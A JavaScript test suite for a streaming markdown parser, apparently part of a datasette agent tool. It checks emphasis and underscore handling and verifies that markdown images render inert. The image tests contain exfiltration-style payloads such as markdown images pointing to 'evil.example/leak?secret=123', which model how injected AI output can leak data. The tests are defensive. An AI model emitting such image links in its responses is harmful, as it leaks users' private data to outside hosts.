import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";

const source = readFileSync(new URL("../datasette_agent/static/smd.js", import.meta.url), "utf8");
const smd = await import("data:text/javascript;base64," + Buffer.from(source).toString("base64"));

function render(chunks) {
    const root = { children: [] };
    const stack = [root];
    const parser = smd.parser({
        data: stack,
        add_token(stack, type) {
            const node = { type, children: [] };
            stack.at(-1).children.push(node);
            stack.push(node);
        },
        end_token(stack) { stack.pop(); },
        add_text(stack, text) { stack.at(-1).children.push(text); },
        set_attr() {},
    });
    for (const chunk of chunks) smd.parser_write(parser, chunk);
    smd.parser_end(parser);
    const tags = new Map([
        [smd.PARAGRAPH, "p"],
        [smd.ITALIC_UND, "em"], [smd.ITALIC_AST, "em"],
        [smd.STRONG_UND, "strong"], [smd.STRONG_AST, "strong"],
        [smd.CODE_INLINE, "code"],
        [smd.RULE, "hr"],
    ]);
    function html(node) {
        if (typeof node === "string") return node;
        const content = node.children.map(html).join("");
        if (node === root) return content;
        const tag = tags.get(node.type) || smd.token_to_string(node.type);
        return "<" + tag + ">" + content + "</" + tag + ">";
    }
    return html(root);
}

const cases = [
    ["This is a function_name. Another_One.", "<p>This is a function_name. Another_One.</p>"],
    ["Same for__double under__scores", "<p>Same for__double under__scores</p>"],
    ["Within a word*italic*should written like this.", "<p>Within a word<em>italic</em>should written like this.</p>"],
    ["And the**bold**like this.", "<p>And the<strong>bold</strong>like this.</p>"],
    ["tools0.function_declarations3.parameters", "<p>tools0.function_declarations3.parameters</p>"],
    ["a_b_c a__b__c a___b___c", "<p>a_b_c a__b__c a___b___c</p>"],
    ["café_au_lait 中文_名字 e\u0301_name", "<p>café_au_lait 中文_名字 e\u0301_name</p>"],
    ["_italic_ and __bold__", "<p><em>italic</em> and <strong>bold</strong></p>"],
    ["_snake_case_ and __snake__case__", "<p><em>snake_case</em> and <strong>snake__case</strong></p>"],
    ["(_italic_) (__bold__)", "<p>(<em>italic</em>) (<strong>bold</strong>)</p>"],
    ["First paragraph\n\n_italic_", "<p>First paragraph</p><p><em>italic</em></p>"],
    ["\\_literal\\_ and `snake_case`", "<p>_literal_ and <code>snake_case</code></p>"],
    ["___bold italic___", "<p><strong><em>bold italic</em></strong></p>"],
    ["`code`_italic_", "<p><code>code</code><em>italic</em></p>"],
];
for (const [input, expected] of cases) {
    test(input, () => {
        assert.equal(render([input]), expected);
        assert.equal(render(Array.from(input)), expected, "one character per chunk");
        for (let split = 0; split <= input.length; split++) {
            assert.equal(render([input.slice(0, split), input.slice(split)]), expected, "split at " + split);
        }
    });
}

// Exercise the DOM renderer used by both saved conversations and live streams.
// Reject image creation and src assignment immediately: removing them later
// would not prevent the browser from making a request.
function renderDefault(chunks) {
    const previousDocument = globalThis.document;
    function element(tagName) {
        assert.notEqual(tagName.toLowerCase(), "img", "must never create an image element");
        return {
            tagName: tagName.toUpperCase(),
            children: [],
            attributes: {},
            appendChild(child) {
                this.children.push(child);
                child.parentElement = this;
                return child;
            },
            setAttribute(name, value) {
                assert.notEqual(name, "src", "must never assign an image URL");
                this.attributes[name] = value;
            },
            get textContent() {
                return this.children.map(child => child.textContent).join("");
            },
        };
    }
    globalThis.document = {
        createElement: element,
        createTextNode: text => ({ textContent: text }),
    };
    try {
        const root = element("div");
        const parser = smd.parser(smd.default_renderer(root));
        for (const chunk of chunks) smd.parser_write(parser, chunk);
        smd.parser_end(parser);
        return root;
    } finally {
        if (previousDocument === undefined) delete globalThis.document;
        else globalThis.document = previousDocument;
    }
}

const imageCases = [
    ["Before ![private data](https://evil.example/leak?secret=123) after.", "Before private data after."],
    ["![relative](/leak?secret=123)", "relative"],
    ["![protocol relative](//evil.example/leak?secret=123)", "protocol relative"],
    ["![embedded](data:image/png;base64,aGVsbG8=)", "embedded"],
    ["![blob](blob:https://example.com/image)", "blob"],
    ["![](https://evil.example/leak?secret=123)", ""],
    ["![first](https://evil.example/1) ![second](https://evil.example/2)", "first second"],
    ["[![linked image](https://evil.example/leak)](/demo)", "linked image"],
    ["![unfinished](https://evil.example/leak", "unfinished"],
    ['<img src="https://evil.example/leak">', '<img src="https://evil.example/leak">'],
];
for (const [input, expected] of imageCases) {
    test("images stay inert: " + input, () => {
        assert.equal(renderDefault([input]).textContent, expected, "saved message");
        assert.equal(renderDefault(Array.from(input)).textContent, expected, "one character per chunk");
        for (let split = 0; split <= input.length; split++) {
            assert.equal(renderDefault([input.slice(0, split), input.slice(split)]).textContent, expected, "split at " + split);
        }
    });
}

test("the DOM renderer preserves links alongside disabled images", () => {
    const root = renderDefault(["![alt](https://evil.example/leak) [table](/demo/items)"]);
    const link = root.children[0].children.find(child => child.tagName === "A");
    assert.equal(link.textContent, "table");
    assert.equal(link.attributes.href, "/demo/items");
});
